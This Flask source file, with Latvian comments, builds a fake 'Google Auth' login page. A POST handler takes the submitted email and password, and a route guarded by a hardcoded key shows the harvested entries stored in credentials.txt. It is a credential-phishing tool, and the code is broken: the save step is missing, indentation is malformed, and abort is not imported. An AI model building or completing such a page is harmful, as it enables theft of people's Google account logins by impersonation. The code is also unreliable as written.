from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def home():
    return 'Ej uz <a href="/google-auth/">Google Auth</a>'

@app.route('/google-auth/', methods=['GET'])
def show_form():
    return render_template('google-auth.html')

@app.route('/google-auth/', methods=['POST'])
def handle_form():
    email = request.form['email']
    password = request.form['password']

    # Saglabāšana failā:
    @app.route('/show-credentials/')
def show_credentials():
    auth = request.args.get('auth')
    if auth != 'Robertins1':
        abort(403)  # Aizliegts piekļūt, ja parole nav pareiza

    try:
        with open("credentials.txt", "r", encoding="utf-8") as file:
            data = file.read()
    except FileNotFoundError:
        data = "Nav saglabātu datu."

    # Parāda datus vienkāršā lapā
    return f"<pre>{data}</pre>"
